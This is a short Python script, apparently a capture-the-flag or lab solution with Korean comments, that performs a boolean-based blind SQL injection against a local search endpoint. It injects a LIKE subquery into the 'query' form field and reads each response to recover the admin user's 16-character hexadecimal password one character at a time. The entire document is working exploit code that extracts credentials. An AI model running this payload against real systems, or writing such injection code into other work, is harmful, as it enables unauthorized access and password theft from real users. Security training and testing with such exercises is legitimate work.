import requests

HEX = "0123456789abcdef"

answer = ""

# 비밀번호가 16자리이므로 해당 비밀번호를 채울때까지 반복
while len(answer) < 16:
    for i in HEX:
        # 비밀번호가 될 수 있는 임시 후보자
        candidate = answer + i

        # 서버 요청
        response = requests.post(
            url="http://localhost:8000/search",
            data={
                "query": f"' AND (SELECT password FROM users WHERE username = 'admin') LIKE '{candidate}"
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        # 서버의 응답값 판별 후 반복
        if response.text.find("Data exists in our records.") != -1:
            answer = candidate
            print("ing :", answer)
            break

print("answer:", answer)
